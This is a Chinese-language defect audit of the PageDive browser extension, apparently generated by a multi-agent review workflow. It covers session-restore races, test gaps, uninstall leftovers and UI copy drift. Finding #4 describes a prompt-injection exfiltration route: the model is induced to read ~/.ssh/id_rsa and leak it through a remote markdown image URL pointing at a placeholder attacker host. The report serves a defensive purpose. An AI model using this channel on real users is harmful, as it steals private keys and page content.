# PageDive 产品深审报告（r52）— 2026-09-27

方法：8 维度并行严审（产品定位 / 架构 / host 代码 / ext 代码 / 安全隐私 / 安装分发 / 测试有效性 / 文案一致性）→ 每条 finding 由「被要求驳倒它」的对抗核查者亲自读码查证 → 仅确认项入库。37 agents，原始 29 条，驳回 10 条，确认 19 条（架构与 host 两维度独立命中同一缺陷，去重后 18 条）：**P1×2、P2×7、P3×9**。

## 总体结论

**方向正确，实现质量高于常态，非最优处集中在「最后一公里」与「防线缺口」。**

- **产品是否正确**：四大核心主张（零配置/复用订阅/内容不出本机/可插拔 workflow）在文档层面自洽且论证质量高——隐私主张有诚实边界披露，Anthropic 执法风险有实证合规路径，v1 范围切分每条有可查证依据。核查者驳回了对主张本身的三条攻击（零配置语义、开箱即用口径、壁垒矛盾论），说明主张经得起对抗检验。
- **是否最优**：四层架构（SW 编排 + sidePanel 渲染 + content 一次性提取 + host 薄壳）与 D3 一致，无过度设计；host 红线 2163/2200（余量 37 行）无现行绕过。不是最优的点：①两条 P1 级工程缺口（SW 会话恢复竞态、扩展侧零测试）；②安全模型有一条未设防旁路（markdown 远程图片外带）；③大量「双源/口径漂移」同族残留（近期连修四轮的同族问题仍有 5 处）。

各维度详评见附录 assessment。

## 确认缺陷清单

### P1（2 条）

**1. persistSession 全量覆写与冷启动 restoreSession 竞态——SW 被 onRemoved/onClicked 冷唤醒时抹掉持久化的全部页签会话（session-lost 复发）**
`apps/extension/src/background/sw.ts:62-92,195,268-292`
- session storage 持久化的唯一目的就是扛 SW 30s 回收（注释自述「看完总结→隔一分钟追问」场景必丢），而 SW 恰好在用户关页签/点图标时最常处于已回收状态——本竞态在主打场景高概率命中，用户追问必得「会话已失效」。
- 代码注释 sw.ts:67-68「微任务先于任何用户消息执行完，无竞态」的论断不成立：`storage.get` 是宏任务级 IPC。
- 修法：onRemoved/anchorAndOpen（及 resume-history/new-session 的 persist 前）先 `await restoreSession()` 再改内存态再 persist（对齐 onActivated/onCreated 既有模式）；或 persistSession 改 merge 语义。并修正 :67-68 错误注释。
- 核查：逐行核实成立，竞态路径真实存在（验证者原话「证据全部准确」）。

**2. apps/extension 5276 行源码只有 2 个纯函数（55 行）有测试——sw.ts 807 行最难的并发逻辑全部零覆盖**
`apps/extension/src/background/sw.ts`
- sw.ts 的注释链（r12/r13/r16/r46/r47…）记录的恰恰是该区域历史上靠真机手测发现的高频 bug：SW 回收后会话丢失、断连句柄残留、迟到帧串台、双发竞速。这些已修 bug 无一有回归测试，下次重构零安全网。
- 且 SW 侧分片算法（Blob size 二分）与 host 侧（字节切片）独立演化，契约测试只锚了常量没锚行为。
- 修法：nmPort.onMessage handler / handleMessage / 分片循环可抽纯函数 + chrome API mock（沿用 dev/chrome-mock.ts shim），先锚 4 个已修 bug：session-lost 竞态、断连清 currentTask、丢片对账取消、分片不超限。

### P2（7 条，去重后）

**3. task-done 终局帧漏发 unrecognized 字段——r51 A2③ 漂移感知链路在最后一跳（stdio.ts 帧组装）断裂**（架构 + host 两维度独立命中）
`packages/host/src/stdio.ts:59-70`
- r51（158abfa）自称补齐的集成缺口恰在最后一跳断裂：task.ts 三处 onDone 都传了、protocol.ts 声明了、App.tsx:464 消费代码也写了，唯独发帧处漏带——CLI 版本漂移的第一信号永远到不了 panel，扩展端消费代码成死代码。
- 测试虚假信心：task.test.ts:144 只断言到 Task 回调层，恰好测到断点前一侧——复刻了该 commit 自己描述的缺口，只是挪到了 stdio 帧。
- 修法：onDone 的 send 对象补 `...(info.unrecognized ? { unrecognized: info.unrecognized } : {})`；stdio.test.ts 补假 CLI 混注未知 type 后断言 task-done 帧含 unrecognized: 2。

**4. panel markdown 渲染允许远程图片——绕过 CLI 沙箱网络围栏的泄出通道**
`apps/extension/src/sidepanel/StreamMarkdown.tsx:48-58`
- codex read-only 沙箱允许读全盘任意文件（v1 接受的前提是沙箱无网络、输出只回 panel）。但 panel 自动加载模型输出里的 `![](https://attacker/…)`：注入指令诱导 codex 读 `~/.ssh/id_rsa` 后以图片 URL 查询参数外带，GET 由 panel 发出，「无网络」围栏被整条绕过。claude 侧也可被诱导把页面内容经此通道回传。这是全链路唯一无缓解的网络出口（扩展 src 零 fetch），且不在任何披露文档中。
- 修法：StreamMarkdown 覆写 `components.img`（返回 null 或仅放行本地路径）或传 `urlTransform` 过滤 http(s) 图片——一行级修复。

**5. 卸载路径完全缺失：npm uninstall 后 NM manifest 与 host-wrapper 永久残留**
`packages/host/src/index.ts:8-27`
- NM 注册的两个 manifest + `~/.ai-page-dive/host-wrapper.sh` 均在 npm 生命周期之外，uninstall 后 Chrome 持续挂着指向已死入口的注册。对信任叙事是「本地最小 footprint」的产品，连 README 手动清理指引都没有。
- 修法：加 `ai-page-dive uninstall`（删两 manifest + wrapper，用户数据询问后保留），或至少 README 补三行手动清理命令。

**6. npm script `dev` = `vite build --watch`——以 dev 之名执行文档明令禁止的单段构建并直写 dist/**
`apps/extension/package.json:8`
- AGENTS.md 已为此写过事故记录（残缺 dist 覆盖真机加载目录 → `Could not load file: 'content.js'`），但破坏性单段构建仍占据最易触达的 `dev` 命令名。
- 修法：`dev` 改为 `vite`（dev server，才是 harness 用途），watch 构建改名 `watch:build` 并用独立 outDir。

**7. pgid 收割 SIGKILL 兜底升级与 runNative 断连关停路径零覆盖**
`packages/host/src/spawn.ts:101-112`
- 硬约束 #5 点名的核心职责：SIGTERM→3s→SIGKILL 升级链、kill(-pid) 组语义、exit 钩子补刀——改成 kill(pid) 单杀，125 用例一个都不会红。
- 修法：假 CLI spawn 忽略 SIGTERM 的孙进程，cancel 后断言其在 REAP_GRACE+余量内死亡；runNative 以注入 send/stdin 方式驱动 shutdown 路径。

**8. deep 档双名并行：下拉同一行「深度总结」+「深度研读」**
`apps/extension/src/sidepanel/workflow-labels.ts:10` + `builtins/deep/WORKFLOW.md:3`
- WF_LABEL.deep =「深度总结」，WORKFLOW.md description 首词 =「深度研读」，下拉同行渲染两者——注释自述「雅名对齐 description 首词」而 deep 自己不满足（product-audit 补了，deep 漏了）。
- 修法：二选一统一，同步 hero CTA/retryNote 等全部引用点。

**9. 一键总结（CTA）轮看门狗/断连文案虚假承诺「你的问题已放回输入框」——输入框实际为空**
`apps/extension/src/sidepanel/App.tsx:214,595`
- v1 P0 主路径超时/断连时：错误气泡说「已放回输入框」（假话，refillFor 对 wf 轮回填空串），retryNote 又说「按 Enter 重试」——两条指引同屏矛盾。r52 前的修法只加了 note 没改气泡。
- 修法：气泡按 refill 是否带 wf 分流，wf 轮改「一键总结未完成——直接按 Enter 以原档位重试」。

### P3（9 条）

| # | 问题 | 位置 | 修法 |
|---|------|------|------|
| 10 | AGENTS.md 硬约束 6 opencode 口径停在已废弃的 2026-09-16（三份文档两个版本） | AGENTS.md:38 | 补 2026-09-22 修订注记指向 DECISIONS 已知限制节 |
| 11 | 卖点「多轮追问」无引擎限定，实际仅 claude 支持（同文档 FAQ 已写明） | README.md:21,71 | 卖点处加「（claude）」限定 |
| 12 | NM 分片契约 512KB 常量三处独立实现，扩展侧零锚定 | sw.ts:773 + shared/protocol.ts:322 + host/nmconst.ts | `import { MAX_CHUNK } from '@ai-page-dive/shared'` 删本地 CH |
| 13 | sessionCwds 映射自证无效的「未来预留」死代码，占红线余量 | task.ts:21-22 | 删除，恢复条件出现再加回 |
| 14 | 真实 CLI 采录 fixture 已在库但零测试重放，parser 只测手抄帧 | scripts/fixtures/*-stream.jsonl | 加重放测试断言 unrecognized===0，过期变红即驱动重采 |
| 15 | 5 个集成用例向真实 ~/.ai-page-dive/history 写盘，失败即残留 | packages/host/test/task.test.ts:98-123 | 统一 fakeHome 或 vitest setup 全局 HOME 指临时目录 |
| 16 | host 10min 超时终局「task exceeded 10min」裸英文直出用户气泡，且唯一不带回填指引 | task.ts:293 + App.tsx:903,554 | ERROR_LABEL.timeout 改完整用户向文案，原文挪 console.debug |
| 17 | hero 次按钮标签双源硬编码「深度总结」/「快速摘要」，未走 WF_LABEL | SummarizeView.tsx:1273-1274 | 改 `WF_LABEL[primaryWf === 'quick' ? 'deep' : 'quick']` |
| 18 | 品牌名两套并存：manifest「AI PageDive」vs 文案「PageDive」，与 D2 拍板名不一致且未留痕 | manifest.json:4 等 | 统一为 PageDive 或 DECISIONS D2 补双名规则 |

## 被驳回项（10 条，透明留档）

| 维度 | 主张 | 驳倒理由（摘要） |
|------|------|------|
| 产品 | 「零配置一键」今天不成立（CWS 未上架、只能 clone+build） | 「零配置」指使用侧无账号/key，README:27 已诚实标注过渡态且规划了终态；「审核滞后」是不可验证的商业推断 |
| 产品 | 「workflow 是核心壁垒」与「实现成本极低」自相矛盾 | 报告 :62 已明确壁垒是适配层；竞速风险已被风险表 #2 自行定价；D9 从未把 Pro 收入放进 v1 承诺 |
| 产品 | 「开箱即用」与 brew 装 Node 5-15 分钟落差 | 口径被冒号定义限定；预期管理已在 install.sh 现场打印；摩擦已被 D10 三评委裁决接受 |
| 架构 | check-host-lines 零依赖断言只查 dependencies，devDep 运行时导入是不设防绕过面 | 当前零违规；设想的绕过在真实发布路径自爆（devDep 不进 npm 包）；属「防未来」型 |
| ext | HistoryView 裸 sendMessage 无 catch 产生未处理拒绝 | 「一贯纪律」前提为假——App.tsx:63 等主干同样模式；MV3 语义下无回调即无 promise 拒绝 |
| 安全 | 临时文件清理计时器随 host 进程消亡，文件留存超设计生命周期 | tmpfile.ts:24-26 已自觉记录并有启动清扫 sweep 兜底 |
| 安全 | install.sh 走 raw main 可变通道，curl\|sh 无完整性自证 | 该 URL 是 AGENTS.md 定的设计流程；威胁模型半个已被脚本注释自觉记录，钉版本 + CWS 上架后可收敛 |
| 安装 | nvm 删旧 Node 后 wrapper 三段回退全断，NM host 静默死亡 | nvm uninstall 删整个版本目录（含 wrapper 自身），场景自相矛盾；面板自愈兜底存在 |
| 测试 | 断言失败时 AGENTS[0].buildArgs 猴补泄漏曾致级联挂 | 逐用例核验：所有 spawn 用例均在 task.run 前重补，泄漏窗口不覆盖任何后续用例 |
| 测试 | echo-CLI 脚本逐字复制两份属同构重复 | 复制仅 3 行且变量名不同；收敛反而引入间接层；非缺陷 |

## 建议行动顺序

1. **立即修**（半小时级）：#3 stdio unrecognized 补字段 + 帧层测试（r51 收尾）；#4 图片外带过滤（一行）；#6 dev 脚本改名（事故已发生过一次）。
2. **本周末修**：#1 SW 会话恢复竞态（对齐 await restoreSession 模式）；#9/#16 超时/断连文案分流（用户主路径假话）；#5 uninstall 子命令。
3. **排期**：#2/#7 补 SW 与收割的回归测试（先锚 4 个已修 bug）；#8/#17/#18 文案单源化扫尾；P3 清单顺手清。

## 附录：各维度 assessment（原文）

**product-thesis**：四大核心主张在文档层面基本自洽且论证质量高——隐私主张有诚实边界披露（README:59 明示内容由所选 CLI 的隐私政策管辖）、Anthropic 执法风险有实证合规路径（report 执行摘要 #9）、v1 范围切分每条有可查证依据。真正的缺口不在主张本身，而在：①「零配置一键」与「窗口期数月、必须快」的执行现实脱节——CWS 仍未上架（核查者驳回其为「缺陷」，但作为执行风险仍成立）；②「workflow 生态是核心壁垒」这一价值假设的措辞需打磨；③文档间 opencode 状态漂移。风险清单 9 条中最大两条（Anthropic 执法、summarize 竞速）前者覆盖充分、后者覆盖不足。

**architecture**：四层切分总体正确且与 D3 一致：content script 只做提取、host 保持 per-connection spawn/幂等/收割、SW 承担编排是 MV3 必然归属，未发现过度设计；runtime.sendMessage 广播代替 port 定向是已记录的 v2 延后项。NM 协议 pong.hostVersion + MIN_HOST_VERSION 单向校验加 r51 unrecognized 漂移信号够用；背压在出口方向有实现（spawn.ts:81-89，4MB 积压 pause/resume）。流式链路设计良好（8KB/50ms 攒批 + JSON 字节口径分片），主要瓶颈（panel 每帧全量重渲染）是技术栈定案明示接受的。红线实测 2163/2200 无现行绕过。

**host-code**：整体质量很高：终局状态机二次发终局守卫与 cwd 回收经逐路径推演闭环；pgid 收割对全部退出路径覆盖完整，reap 的 pid 复用守卫正确；tmpfile 的 symlink 劫持三层防御（属主判定+UUID+wx）、NM 帧失步终结、背压控制均无可指认缺陷；claude is_error 语义（硬约束 #4）在解析器与终局判定两处正确落地。确凿问题仅 stdio.ts 帧构造层断点一条（见 #3）。

**ext-code**：整体质量很高：面板侧竞态防御（finished 台账、foreignAdopt 邮戳、pending 双发门、cancelledTaskIds）和 SW 侧会话持久化设计有密集真实回归注释支撑，流式长输出性能（段落级 memo + trailing throttle + 128KB 降级）处理得当，dev harness 确实不在 rollupOptions.input、生产构建零包含。但 storage.session 恢复模型有冷启动竞态（见 #1），另有一个 npm script 隐患（#6）。

**security-privacy**：整体安全水位显著高于同类产品：零凭证约束全链路成立（全仓 src 无任何 token/oauth/apiKey/Authorization 处理）；claude 三重围栏（Read 路径白名单 + --permission-mode default + strict-mcp-config 清空 MCP）、codex --sandbox read-only（resume 轮等价保持）、prompt 恒定安全边界声明 + 元数据全过 sanitizeMeta；临时文件 0700/0600/wx/UUID 四重防御；NM 注册校验扩展 ID + 原子写 + root 守卫；manifest 权限与声明逐条相符（optional 权限默认关闭、仅用户点击时 request）。唯一未设防旁路是 markdown 远程图片（见 #4）。

**install-dx**：安装主路径成熟，明显经多轮深审打磨：Node>=18 探测与 brew 兜底闭环、钉版本有 CI 门禁锁 7 处一致、ext-id 32 位校验、manifest 原子写 + origins 追加不覆盖、root 守卫、升级路径正确（npm 更新重跑 postinstall，wrapper 用 brew opt 稳定软链）。CWS 政策面：nativeMessaging + optional 权限组合是 Chrome 官方推荐模式，有 KeePassXC/1Password 在架先例，remote code 红线不触及——政策风险低，但商店页需如实披露本机组件与 curl|sh 命令。真问题：卸载缺失（#5）与 nvm 回退链（已驳回）。

**tests-quality**：host 侧 112 用例质量整体偏高：绝大多数断言锚定行为而非实现，每个回归用例锚定真实修过的 bug。但覆盖严重偏科：extension 5276 行只有 55 行有测试（见 #2）；host 进程级路径（runNative shutdown、SIGKILL 兜底、心跳）零覆盖（#7）；真实 fixture 零重放（#14）；5 用例写真盘（#15）。同构重复集中在 task.test.ts monkeypatch 样板（约 1/3），不算凑数但可收敛。

**ux-copy**：整体文案工程质量相当高：错误归因普遍遵循「用户向气泡 + 维护者向 console.debug」分工，「重采样」已收敛为维护者术语、用户面统一「重试/重发」，近三轮修过的地方（WF_LABEL 抽取、npmCmd 复用、ctaWf 单源）实查无复发。残留与近期所修同族：deep 档双名（#8）、虚假回填承诺（#9）、host 超时裸英文（#16）、hero 次按钮双源（#17）、品牌双名（#18）。无违反硬约束的文案问题。

---
*生成：r52 产品深审 workflow（37 agents，对抗核查制）。被驳回项全文与 verify 论证见会话留档。*
